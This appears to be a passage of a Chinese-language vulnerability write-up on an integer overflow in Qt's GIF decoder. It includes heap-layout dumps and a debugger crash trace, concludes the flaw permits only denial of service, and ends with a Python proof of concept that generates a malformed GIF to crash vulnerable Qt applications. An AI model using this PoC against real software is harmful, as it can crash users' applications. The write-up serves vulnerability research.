    //left 和 right还有y 的来源 gifhandler.cpp line 338,366int newleft=LM(hold[1], hold[2]);
    int newtop=LM(hold[3], hold[4]);
    left = newleft;
    top = newtop;y = top;right=qMax(0, qMin(left+width, swidth)-1);
    bottom=qMax(0, qMin(top+height, sheight)-1);
同时还有我们进入memcpy函数外面的对my的判断
    my = qMin(7, bottom-y);
这里my也不能小于0，小于0也不会调用memcpy。同时我们为了搞清楚溢出的边界在哪里，我们必须知道分配的堆有多大，我们断在**bits = image
->bits()** 这里immunitydebugger跟入，断点断在0x68f01e9f
可以看见这里的eax=0x318ab90
借助mona插件我们得到堆内存的布局如下
    0BADF00D       _HEAP_ENTRY  psize   size  unused  UserPtr   UserSize
    0BADF00D          0318a830  00070  00028   00018  0318a838  00000010 (16) (Fill pattern,Extra present,Busy)
    0BADF00D          0318a858  00028  00118   00018  0318a860  00000100 (256) (Fill pattern,Extra present,Busy)
    0BADF00D          0318a970  00118  00218   00018  0318a978  00000200 (512) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ab88  00218  002d8   00018  0318ab90  000002c0 (704) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ae60  002d8  02400   00000  0318ae68  00002400 (9216) (Fill pattern)
    0BADF00D          0318d260  02400  00038   00018  0318d268  00000020 (32) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d298  00038  00098   00018  0318d2a0  00000080 (128) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d330  00098  00058   00018  0318d338  00000040 (64) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d388  00058  00038   00018  0318d390  00000020 (32) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d3c0  00038  00050   00018  0318d3c8  00000038 (56) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d410  00050  00060   00018  0318d418  00000048 (72) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d470  00060  00060   00018  0318d478  00000048 (72) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d4d0  00060  00060   0001c  0318d4d8  00000044 (68) (Fill pattern,Extra present,Busy)
    0BADF00D          0318d530  00060  00010   00000  0318d538  00000010 (16) (Fill pattern)
    0BADF00D          0318d540  00010  015b0   0001a  0318d548  00001596 (5526) (Fill pattern,Extra present,Busy)
    0BADF00D          0318eaf0  015b0  00030   00018  0318eaf8  00000018 (24) (Fill pattern,Extra present,Busy)
    0BADF00D          0318eb20  00030  00058   00018  0318eb28  00000040 (64) (Fill pattern,Extra present,Busy)
    0BADF00D          0318eb78  00058  00038   0001a  0318eb80  0000001e (30) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ebb0  00038  00030   00018  0318ebb8  00000018 (24) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ebe0  00030  00058   00018  0318ebe8  00000040 (64) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ec38  00058  00050   00018  0318ec40  00000038 (56) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ec88  00050  00088   00018  0318ec90  00000070 (112) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ed10  00088  00038   00018  0318ed18  00000020 (32) (Fill pattern,Extra present,Busy)
    0BADF00D          0318ed48  00038  10018   00019  0318ed50  0000ffff (65535) (Fill pattern,Extra present,Busy)
    0BADF00D          0319ed60  10018  00018   00000  0319ed68  00000018 (24) (Fill pattern)
    0BADF00D          0319ed78  00018  04018   00018  0319ed80  00004000 (16384) (Fill pattern,Extra present,Busy)
    0BADF00D          031a2d90  04018  04018   00018  031a2d98  00004000 (16384) (Fill pattern,Extra present,Busy)
    0BADF00D          031a6da8  04018  04018   00018  031a6db0  00004000 (16384) (Fill pattern,Extra present,Busy)
    0BADF00D          031aadc0  04018  08018   00018  031aadc8  00008000 (32768) (Fill pattern,Extra present,Busy)
    0BADF00D          031b2dd8  08018  21208   00000  031b2de0  00021208 (135688) (Fill pattern)
    0BADF00D          031d3fe0  21208  00020   00003  031d3fe8  0000001d (29) (Busy)
    0BADF00D          0x031d3ff8 - 0x034f0000 (end of segment) : 0x31c008 (3260424) uncommitted bytes
    0BADF00D
我们可以看到大小是0x2c0=(0x10(swidth)*0xb(sheight)*4(sizeof(Qrgb)))。
依据以上的分析，我们可以得出来，如果我们设置top大于sheight的时候，就有导致my小于0，不能执行memcpy，而其他情况下这里的代码可以保证复制的数据不溢出边界，但是如果我将right调整得比left小的话那么就发生了整形溢出，因为memcpy的时候最后一个参数是无符号整数，所以就会变成一个特别大的数字，从而导致复制数据到了不可写的地方导致程序崩溃。我们再来分析这个数字在哪个范围呢？因为的left,width,top的范围都是0~65535所以right最小是0，left最大是65535,(right-left+1)*sizeof(QRgb)(4)=0xFFFC0008,这个时候的memcpy的值是最小的，但是还是太大了，所以导致了崩溃。因而这个漏洞也就是只能够导致dos的，不能够利用。
    //断在68f016d
    Breakpoint 0 hit
    eax=03f2c628 ebx=00000080 ecx=ffffffc0 edx=00000001 esi=03141388 edi=00000000
    eip=68f0161d esp=0022cde4 ebp=0022cdf8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
    qgif4+0x161d:
    68f0161d 8b7df0          mov     edi,dword ptr [ebp-10h] ss:0023:0022cde8=031413c8
    0:000> g
    (8b4.ab4): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=03f2c628 ebx=00000080 ecx=fff7c388 edx=00000001 esi=031c4fc0 edi=031c5000
    eip=68f01620 esp=0022cde4 ebp=0022cdf8 iopl=0         nv up ei pl nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206
    qgif4+0x1620:
    68f01620 f3a4            rep movs byte ptr es:[edi],byte ptr [esi]
**  
**
**PoC**
最后附上PoC，其实这里的PoC就是生成了一个gif文件，任何使用上述有漏洞的Qt版本来处理gif的软件就会发生崩溃。
    #!/use/bin/python
    #coding:utf-8
    import sys
    def encode_lzw(stri,lzw_size):
        clear_code=1 << lzw_size
        end_code = clear_code+1
        entry,head,tail=0,0,0
        dit={}
        outp=[]
        ll=len(stri)
        head=stri[0]
        cur_code=end_code+1
        for i in xrange(1,ll):
            tail=stri[i]
            kk=(head,tail)
            if dit.has_key(kk):
                #如果在表里面的话
                head=dit[kk]
                continue
            else:
                outp.append(head)
                dit[kk]=cur_code
                print 'key:%s value:%s'%(kk,cur_code)
                cur_code+=1
                head=tail
                continue
        return outp
    import struct
    import math
    if __name__ == "__main__":
        header='GIF89a'
        my_wdith=0x1
        my_height=0xb
        my_color_count=32
        swdith=struct.pack('H',my_wdith)
        sheight=struct.pack('H',my_height)
        scode= struct.pack('B',0xc0+( int( math.log(my_color_count,2))-1 )) +'x00'+'x00'
        color_map=''
        for i in xrange(my_color_count):
            color_map+=struct.pack('bbb',i,i,i)
        introducer='x21xf9'
        graphicControlExtension='x04'+'x00'*4
        skip='x00x2c'
        left=struct.pack('H',0xffff)
        top=struct.pack('H',0)
        width=struct.pack('H',0x10)
        height=struct.pack('H',0xB)
        flg=struct.pack('B',0x40)
        lzwsize=struct.pack('B',0x5)
        datablocksize=struct.pack('B',0x81)
        plain=''
        for i in xrange(26):
            plain += chr(ord('A')+i) *8
        plain =plain+'A'*20+'BCDEFGHIJK'*2+'CCC'+'KJUI'
        print plain
        enc=  encode_lzw(plain,5)
        datablock=''
        for i in enc:
            if type(i)==str:
                datablock+=struct.pack('B',ord(i)-ord('A'))
            else :
                datablock+=struct.pack('B',i)
        print datablock
        eof='x21x00x3b'
        fp=open('1.gif','wb')
        bin_data=header+swdith+sheight+scode+color_map+introducer+graphicControlExtension
        bin_data+=skip+left+top+width+height+flg+lzwsize +datablocksize+datablock+eof
        fp.write(bin_data)
        fp.close()